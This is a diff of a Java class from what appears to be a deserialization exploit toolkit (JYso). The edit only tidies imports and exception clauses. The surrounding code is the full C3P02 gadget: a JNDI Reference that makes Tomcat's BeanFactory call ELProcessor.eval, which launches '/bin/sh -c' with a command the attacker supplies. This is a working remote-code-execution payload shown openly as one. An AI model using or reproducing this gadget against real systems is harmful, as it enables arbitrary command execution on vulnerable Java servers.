@@ -7,15 +7,12 @@ import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import org.apache.naming.ResourceRef;
 
-import javax.naming.NamingException;
 import javax.naming.Reference;
 import javax.naming.Referenceable;
 import javax.naming.StringRefAddr;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
 import java.io.PrintWriter;
-import java.sql.SQLException;
-import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
 import static com.qi4l.JYso.gadgets.utils.Utils.getJSEngineValue;
@@ -25,6 +22,7 @@ import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.generateClass;
  * C3P02 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
  */
 
+@SuppressWarnings({"unused"})
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35"})
 @Authors({Authors.QI4L})
 public class C3P02 implements ObjectPayload<Object> {
@@ -50,36 +48,36 @@ public class C3P02 implements ObjectPayload<Object> {
             this.cmd = cmd;
         }
 
-        public Reference getReference() throws NamingException {
+        public Reference getReference() {
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
             ref.add(new StringRefAddr("forceString", "QI4L=eval"));
             ref.add(new StringRefAddr("QI4L", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + cmd + "']).start()\")"));
             return ref;
         }
 
-        public PrintWriter getLogWriter() throws SQLException {
+        public PrintWriter getLogWriter() {
             return null;
         }
 
-        public void setLogWriter(PrintWriter out) throws SQLException {
+        public void setLogWriter(PrintWriter out) {
         }
 
-        public int getLoginTimeout() throws SQLException {
+        public int getLoginTimeout() {
             return 0;
         }
 
-        public void setLoginTimeout(int seconds) throws SQLException {
+        public void setLoginTimeout(int seconds) {
         }
 
-        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
+        public Logger getParentLogger() {
             return null;
         }
 
-        public PooledConnection getPooledConnection() throws SQLException {
+        public PooledConnection getPooledConnection() {
             return null;
         }
 
-        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
+        public PooledConnection getPooledConnection(String user, String password) {
             return null;
         }
     }
